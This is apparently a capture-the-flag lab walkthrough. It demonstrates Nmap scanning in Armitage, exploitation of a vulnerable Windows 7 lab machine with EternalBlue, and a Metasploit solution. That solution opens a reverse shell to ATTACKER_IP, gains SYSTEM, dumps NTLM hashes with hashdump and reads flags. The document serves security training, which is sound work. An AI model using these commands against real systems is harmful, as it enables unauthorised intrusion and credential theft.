# Sample Exploit  

## Host Enumeration with Armitage  

Before letting you go off on your own, we're going to demonstrate how to exploit a sample Virtual Machine. First, we will execute a port scan within Armitage by navigating to:  

**Hosts -> Nmap Scan -> Quick Scan**  

After selecting "Quick Scan", a new option will pop up, prompting you to enter the IP Address range you would like to scan. You should enter the IP Address of the deployed Virtual Machine in this box.  

**Input menu:** "Enter Scan Range" with the IP Address `VICTIM_MACHINE`  

After pressing **"OK"**, and waiting a moment, you should see a new tab open up called **"nmap"** and a new machine display in the **"Workspace"** window. In the **"nmap"** tab, you will see the raw scan results.  

**Results from the Nmap port scan**  

Now that you have learned how to execute a basic port scan, try to execute various other scans against the target to gather more information.  

> **Hint:** A **Comprehensive Scan** will grab banners, enumerate software versions, OS versions, and much more!

---

## Exploitation with Armitage  

Next, we will demonstrate exploitation using Armitage. Our victim in this example is a **Windows 7** machine (specifically **Blue**), which is vulnerable to the **EternalBlue** exploit.  

To find this, navigate through:  

**Exploit -> Windows -> SMB**  

Here, you will see a list of available exploits.  

**Listing all the exploits within Armitage**  

To launch an exploit:  

1. Double-click on the exploit of choice, or  
2. Drag and drop the exploit onto the target host.  

A new window will open, where you can click **"Launch"** to execute the exploit.  

**Eternal Blue Exploit Module Information**  

After clicking **"Launch"**, a new **"Exploit"** tab will open. Armitage will automatically execute the required checks and attempt exploitation.  

In the case of **EternalBlue**, it runs a **standard check script** followed by the **exploit script** until it successfully gains a shell.  

By default, this exploit selects a **Bind shell**. Ensure that you carefully read the exploit options to determine whether a **Bind Shell** or a **Reverse Shell** is more suitable.  

**A Successful Exploitation Attempt from Armitage**  

Once you obtain a shell:  

- Right-click on the host and select **"Interact"**.  
- This will open a standard shell.  
- To escalate to a Meterpreter shell, run the `multi/manage/shell_to_meterpreter` module.  

**Compromised Host in Armitage**  

---

## Practice Time  

Now that you have learned how to exploit hosts using Armitage, it's time to practice hacking a virtual machine using **Metasploit** and **Armitage**.  

There are **multiple exploit paths** available. We encourage you to explore different approaches to understand **exploitation** and **post-exploitation** better.  

> **Reminder:** Armitage is simply a **GUI for Metasploit**. All exploits and modules are categorized identically.

---

## Solution  

If you encounter difficulties compromising the machine, follow this step-by-step guide using **Metasploit**.

### **Launching Metasploit and using EternalBlue!**  

```bash
root@attackbox$ msfconsole -q
msf5 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST eth0
LHOST => eth0
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST VICTIM_IP
RHOST => VICTIM_IP
msf5 exploit(windows/smb/ms17_010_eternalblue) > run
```

```bash
[*] Started reverse TCP handler on ATTACKER_IP:4444 
[*] VICTIM_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] VICTIM_IP:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
[*] VICTIM_IP:445      - Scanned 1 of 1 hosts (100% complete)
[*] VICTIM_IP:445 - Connecting to target for exploitation.
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Now that we have **SYSTEM-level** access, we can use the `hashdump` command to retrieve NTLM hashes:  

### **Running Hashdump**  

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c156d5d<snip!>4d6e0943c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae93<snip!>d7e0c089c0:::
Ted:1001:aad3b435b51404eeaad3b435b51404ee:2e2618f266da8867<snip!>5c1309a5c:::
meterpreter > 
```

Finally, retrieve the flags stored in the **user's home folders**.

### **Collecting our flags!**  

```bash
meterpreter > cat C:/Users/Administrator/Desktop/root.txt
THM{bd6ea6c87<snip!>21081132744}
meterpreter > cat C:/Users/Ted/Desktop/user.txt
THM{217fa45e3<snip!>fc0be28e760} 
```

---

## Conclusion  

And that's it! You have successfully compromised **Ted’s PC** using **EternalBlue** in both **Armitage** and **Metasploit**.